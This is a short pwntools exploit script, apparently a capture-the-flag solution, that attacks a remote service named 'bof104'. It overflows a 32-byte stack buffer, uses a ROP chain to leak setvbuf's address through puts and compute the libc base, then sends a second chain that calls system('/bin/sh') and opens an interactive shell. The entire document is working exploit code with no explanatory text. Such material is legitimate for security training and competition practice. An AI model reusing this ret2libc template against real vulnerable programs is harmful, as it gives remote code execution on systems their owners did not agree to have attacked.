from pwn import * 
#io = process("./bof104")
io = remote("bof104.sstf.site",1337)
libc = ELF("./libc.so.6")

popRdi = p64(0x401263)
putsPlt = p64(0x401060)
setvbufGot = p64(0x404028)
bofme = p64(0x401176)
ret = p64(0x4011a6)

rop1  = b"A"*32 + p64(0)
rop1 += popRdi + setvbufGot + putsPlt 
rop1 += bofme
#gdb.attach(io,gdbscript="break *0x00000000004011a6")
io.send(rop1)

pause()
libc.address = u64(io.recv()[-7:-1].ljust(8,b"\x00")) - libc.symbols["setvbuf"]
log.info("LIBC BASE: " + hex(libc.address))

rop2  = b"A"*32 + p64(0) + ret
rop2 += popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
io.send(rop2)
io.interactive()
